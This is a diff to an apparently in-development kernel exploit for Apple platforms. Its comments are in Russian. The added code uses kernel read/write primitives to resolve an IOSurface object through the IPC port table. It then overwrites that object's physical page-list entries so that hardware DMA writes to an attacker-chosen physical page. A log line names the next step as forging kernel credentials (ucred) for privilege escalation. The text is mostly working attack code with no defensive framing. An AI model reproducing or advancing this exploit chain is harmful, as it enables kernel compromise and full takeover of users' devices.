@@ -5835,6 +5835,109 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                   (unsigned long long)isTable, (unsigned long long)pr2,
                   (unsigned long long)tk2, (unsigned long long)spc2]);
     }
+    // === 1.9.143: ПРЯМОЙ порт-маршрут к IOSurface, БЕЗ реестра IOSurfaceRoot ===
+    // isTable-цепочка уже работает (этот бут: svc 0x8423 → живой kobject). Вместо
+    // обхода реестра клиентов делаем mach-порт на dstS и резолвим ЕГО kobject:
+    //   isTable[port>>8].ie_object → ipc_port → ip_kobject = IOSurfaceSendRight →
+    //   скан полей: указатель на объект с [X+0x10]==dstID — это сам IOSurface.
+    // Затем собираем ВСЕ копии page-list'а (в самом объекте за 0x400, в
+    // rangeObj(+0x178), в XPF ranges(+0x360 если ptr, gate по rangeCount +0x3a4))
+    // и патчим pfn→ctl ДО любого submit: execute скейлера снимает DVA-снапшот
+    // с уже пропатченного списка — никакой гонки с churn-окном.
+    uint64_t surfVA = 0, rangesVA = 0, rootVA = 0;
+    uint64_t slotVAs[8] = {0}, origQs[8] = {0};
+    int slotForm[8] = {0};
+    int nSlots = 0;
+    if (isTable && dstS) {
+        typedef mach_port_t (*CreateMachPort_t)(IOSurfaceRef);
+        static CreateMachPort_t pCreateMachPort = NULL;
+        if (!pCreateMachPort)
+            pCreateMachPort = (CreateMachPort_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+        mach_port_t smp = pCreateMachPort ? pCreateMachPort(dstS) : 0;
+        if (smp) {
+            uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (smp >> 8);
+            uint64_t oRaw = early_kread64(eVA + off_ipc_entry_ie_object);
+            uint64_t pVA = kp_untag_ptr(oRaw);
+            uint64_t kRaw = kpLooksLikeKernelPointer(pVA) ? early_kread64(pVA + off_ipc_port_ip_kobject) : 0;
+            uint64_t kobj = kp_untag_ptr(kRaw);
+            kpNote(r, [NSString stringWithFormat:@"  порт-маршрут: smp=0x%x eVA=%#llx port=%#llx kobj(SendRight)=%#llx",
+                      smp, (unsigned long long)eVA, (unsigned long long)pVA, (unsigned long long)kobj]);
+            if (kpLooksLikeKernelPointer(kobj)) {
+                if ((uint32_t)early_kread64(kobj + 0x10) == dstID) {
+                    surfVA = kobj;   // kobject — сам IOSurface, без SendRight-обёртки
+                    kpNote(r, @"  kobject == IOSurface напрямую");
+                } else {
+                    for (uint32_t o = 0; o < 0x100 && !surfVA; o += 8) {
+                        uint64_t c = kp_untag_ptr(early_kread64(kobj + o));
+                        if (!kpLooksLikeKernelPointer(c)) continue;
+                        if ((uint32_t)early_kread64(c + 0x10) != dstID) continue;
+                        surfVA = c;
+                        kpNote(r, [NSString stringWithFormat:@"  SendRight+0x%x → IOSurface %#llx ([+0x10]==dstID %u)",
+                                  o, (unsigned long long)c, dstID]);
+                    }
+                }
+            }
+            if (surfVA) {
+                uint64_t objs[3] = { surfVA, 0, 0 };
+                uint64_t ro = kp_untag_ptr(early_kread64(surfVA + 0x178));
+                if (kpLooksLikeKernelPointer(ro)) objs[1] = ro;
+                uint64_t rcnt = early_kread64(surfVA + 0x3a4);
+                uint64_t xr = early_kread64(surfVA + 0x360);
+                uint64_t xru = kp_untag_ptr(xr);
+                if (rcnt >= 1 && rcnt <= 4 && kpLooksLikeKernelPointer(xru)) objs[2] = xru;
+                kpNote(r, [NSString stringWithFormat:@"  IOSurface %#llx: rangeObj(+0x178)=%#llx ranges(+0x360)=%#llx rangeCount(+0x3a4)=%llu",
+                          (unsigned long long)surfVA, (unsigned long long)ro,
+                          (unsigned long long)xr, (unsigned long long)rcnt]);
+                for (int k = 0; k < 3 && nSlots < 8; k++) {
+                    uint64_t ob = objs[k];
+                    if (!ob) continue;
+                    uint32_t lim = (k == 0) ? 0x400 : 0x100;
+                    for (uint32_t o = 0; o + 8 <= lim && nSlots < 8; o += 8) {
+                        uint64_t q = early_kread64(ob + o);
+                        int form = 0;
+                        if ((uint32_t)(q >> 32) == pfn32) form = 1;       // {pfn32, pagecount}
+                        else if (q == backingPA) form = 2;                // IOAddressRange.addr
+                        else if (q == (backingPA >> 14)) form = 3;        // pfn64
+                        if (!form) continue;
+                        BOOL dup = NO;
+                        for (int j = 0; j < nSlots; j++) if (slotVAs[j] == ob + o) { dup = YES; break; }
+                        if (dup) continue;
+                        slotVAs[nSlots] = ob + o;
+                        origQs[nSlots] = q;
+                        slotForm[nSlots] = form;
+                        kpNote(r, [NSString stringWithFormat:@"  pfn-слот#%d форма%d @ %#llx: %#018llx",
+                                  nSlots, form, (unsigned long long)(ob + o), (unsigned long long)q]);
+                        nSlots++;
+                    }
+                }
+                if (nSlots) {
+                    rangesVA = slotVAs[0];   // совместимость со старым кодом ниже
+                    int stuck = 0;
+                    for (int j = 0; j < nSlots; j++) {
+                        uint64_t newQ = (slotForm[j] == 1)
+                                      ? (((uint64_t)ctlPFN << 32) | (origQs[j] & 0xFFFFFFFFULL))
+                                      : (slotForm[j] == 2) ? ctlPA : (ctlPA >> 14);
+                        early_kwrite64(slotVAs[j], newQ);
+                        uint64_t rb = early_kread64(slotVAs[j]);
+                        if (rb == newQ) stuck++;
+                        kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА слот#%d %#018llx → %#018llx — %@",
+                                  j, (unsigned long long)origQs[j], (unsigned long long)newQ,
+                                  rb == newQ ? @"ПРИЛИПЛО" : @"НЕ прилипло"]);
+                    }
+                    kpNote(r, [NSString stringWithFormat:@"  ★ порт-маршрут: surfVA=%#llx, пропатчено %d/%d слотов ДО submit",
+                              (unsigned long long)surfVA, stuck, nSlots]);
+                    if (!stuck) nSlots = 0;   // запись не липнет — откат к старым путям
+                } else {
+                    kpNote(r, @"  порт-маршрут: IOSurface найден, но pfn-слотов нет — уходим в старые пути");
+                }
+            } else {
+                kpNote(r, @"  порт-маршрут: IOSurface через SendRight не найден — уходим в старые пути");
+            }
+        } else {
+            kpNote(r, [NSString stringWithFormat:@"  порт-маршрут: IOSurfaceCreateMachPort %@ — уходим в старые пути",
+                      pCreateMachPort ? @"вернул 0" : @"не найден (dlsym)"]);
+        }
+    }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
     //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
@@ -5888,8 +5991,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     //    верификация [surfVA+0x10]==dstID. UC находим перебором наших портов —
     //    читаем kreadbuf'ом (1.9.120 промах: kpRead не транслирует zone map,
     //    где UC и живёт — фреймворковский UC отбрасывался молча).
-    uint64_t surfVA = 0, rangesVA = 0, rootVA = 0;
-    {
+    // 1.9.143: surfVA/rangesVA/rootVA объявлены выше (порт-маршрут); реестр —
+    // только если порт-маршрут не нашёл поверхность.
+    if (!surfVA) {
         // 1.9.137: реестр клиентов по TASK (раунд 21, findClientByTask):
         //    IOSurfaceRoot → кэш 2 слота @ root+0x418/+0x428, иначе count @
         //    root+0x408 + записи {task,client} 0x10 @ root+0x440 → наш client
@@ -6020,23 +6124,32 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         return r;
     }
 
-    // 4. подмена ranges[0].pfn — стоит ДО execute victim-опа (churn-backlog
-    //    держит workloop ≈30-50мс). Ждём execute, проверки, restore.
-    uint64_t origQ = 0;
-    kreadbuf(rangesVA, &origQ, 8);
-    if ((uint32_t)(origQ >> 32) != pfn32) {
-        kpNote(r, [NSString stringWithFormat:@"  ranges qword ушёл (%#018llx) — записи НЕ БУДЕТ", (unsigned long long)origQ]);
-        IOObjectRelease(svc);
-        free(ctl);
-        return r;
+    // 4. подмена pfn: порт-маршрут (1.9.143) уже пропатчил слоты ДО submit;
+    //    старые пути (реестр/дженерик-скан) находят rangesVA ПОСЛЕ submit —
+    //    патчим сейчас, в окне churn-backlog (workloop занят ≈30-50мс), до execute.
+    if (!nSlots) {
+        uint64_t origQ = 0;
+        kreadbuf(rangesVA, &origQ, 8);
+        if ((uint32_t)(origQ >> 32) != pfn32) {
+            kpNote(r, [NSString stringWithFormat:@"  ranges qword ушёл (%#018llx) — записи НЕ БУДЕТ", (unsigned long long)origQ]);
+            IOObjectRelease(svc);
+            free(ctl);
+            return r;
+        }
+        slotVAs[0] = rangesVA;
+        origQs[0] = origQ;
+        slotForm[0] = 1;
+        nSlots = 1;
+        uint64_t newQ = ((uint64_t)ctlPFN << 32) | (origQ & 0xFFFFFFFFULL);
+        kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА ranges %#018llx → %#018llx (pfn %#x → %#x, lo32 сохранён)",
+                  (unsigned long long)origQ, (unsigned long long)newQ, pfn32, ctlPFN]);
+        kwritebuf(rangesVA, &newQ, 8);
+        uint64_t rb = 0;
+        kreadbuf(rangesVA, &rb, 8);
+        kpNote(r, [NSString stringWithFormat:@"  readback = %#018llx %@", (unsigned long long)rb, rb == newQ ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
+    } else {
+        kpNote(r, [NSString stringWithFormat:@"  %d pfn-слот(а) пропатчены порт-маршрутом ДО submit — victim подхватывает ctlPA при первом execute", nSlots]);
     }
-    uint64_t newQ = ((uint64_t)ctlPFN << 32) | (origQ & 0xFFFFFFFFULL);
-    kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА ranges %#018llx → %#018llx (pfn %#x → %#x, lo32 сохранён)",
-              (unsigned long long)origQ, (unsigned long long)newQ, pfn32, ctlPFN]);
-    kwritebuf(rangesVA, &newQ, 8);
-    uint64_t rb = 0;
-    kreadbuf(rangesVA, &rb, 8);
-    kpNote(r, [NSString stringWithFormat:@"  readback = %#018llx %@", (unsigned long long)rb, rb == newQ ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
     kpNote(r, @"  жду execute victim-опа (backlog ~800 async)…");
     usleep(400000);   // backlog drains → victim executes → DMA
     int changed = 0;
@@ -6053,8 +6166,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     IOSurfaceUnlock(dstS, 0, NULL);
     kpNote(r, [NSString stringWithFormat:@"  dst пиксели после execute: ненулевых = %d — %@", nzd,
               nzd ? @"DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)" : @"в dst пусто"]);
-    // restore ranges
-    kwritebuf(rangesVA, &origQ, 8);
+    // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
+    for (int j = 0; j < nSlots; j++)
+        early_kwrite64(slotVAs[j], origQs[j]);
     if (changed) {
         kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===", changed]);
     } else {
